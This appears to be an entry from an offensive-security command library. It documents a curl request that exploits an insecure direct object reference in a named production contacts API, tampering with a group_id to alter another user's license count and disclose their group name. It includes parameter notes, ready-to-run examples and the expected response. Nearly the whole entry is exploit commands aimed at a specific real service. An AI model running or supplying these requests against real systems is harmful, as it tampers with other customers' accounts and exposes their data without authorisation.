---
data: >-
  curl -X POST 'https://api.8x8.com/contacts' -H 'Authorization: Bearer
  YOUR_TOKEN' -H 'Content-Type: application/json' -d '{"contact_name": "Test
  Contact", "group_id": "TARGET_GROUP_ID"}'
tags:
  - web
  - api
  - exploit
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 4342d00a-a93e-45f3-ab9a-8285f2966f8d
created_at: '2025-12-14T17:25:23.386Z'
updated_at: '2025-12-14T17:25:23.386Z'
verified: false
validated: true
submitted: true
---
# curl-add-contact-idor

## Command

```bash
curl -X POST 'https://api.8x8.com/contacts' \
  -H 'Authorization: Bearer YOUR_TOKEN' \
  -H 'Content-Type: application/json' \
  -d '{"contact_name": "Test Contact", "group_id": "TARGET_GROUP_ID"}'
```

## Description

This curl command exploits an IDOR vulnerability by sending a POST request to the 8x8 add contacts API with a tampered group_id parameter, allowing manipulation of another user's group license count and disclosure of the group name. Use it in authenticated sessions to test for insufficient validation on object references.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `'https://api.8x8.com/contacts'` | The API endpoint URL for adding contacts | Yes |
| `-H 'Authorization: Bearer YOUR_TOKEN'` | Authentication header with session token | Yes |
| `-H 'Content-Type: application/json'` | Sets the request body content type to JSON | Yes |
| `-d '{"contact_name": "Test Contact", "group_id": "TARGET_GROUP_ID"}'` | JSON payload with contact details and tampered group_id | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://api.8x8.com/contacts' -H 'Authorization: Bearer abc123' -H 'Content-Type: application/json' -d '{"contact_name": "Test", "group_id": "12345"}'
```

### Advanced Usage

```bash
curl -X POST 'https://api.8x8.com/contacts' -H 'Authorization: Bearer abc123' -H 'Content-Type: application/json' -d '{"contact_name": "Test Contact", "group_id": "99999", "email": "test@example.com"}'
```

## Expected Output

Successful response: {"success": true, "message": "Contact added", "group_name": "Target Group Name"}. The group license count increments, and the name is disclosed. Errors may indicate invalid token or group.

## Related

- [[Related Procedure: Exploit-IDOR-in-Add-Contact-Request]]
